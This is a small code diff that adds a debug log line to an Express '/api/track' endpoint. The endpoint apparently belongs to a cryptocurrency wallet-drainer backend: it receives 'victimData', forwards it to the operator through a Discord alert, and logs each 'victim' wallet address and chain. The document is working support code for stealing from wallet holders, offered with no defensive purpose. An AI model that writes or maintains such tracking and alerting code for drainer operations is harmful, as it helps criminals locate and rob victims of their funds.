@@ -611,6 +611,7 @@ app.post("/api/track", async (req, res) => {
     const victimData = req.body;
 
   // Send Discord alert
+    console.log("🔍 DEBUG: About to send Discord alert for:", victimData.walletAddress);
   await sendDiscordAlert(victimData);
     
     console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
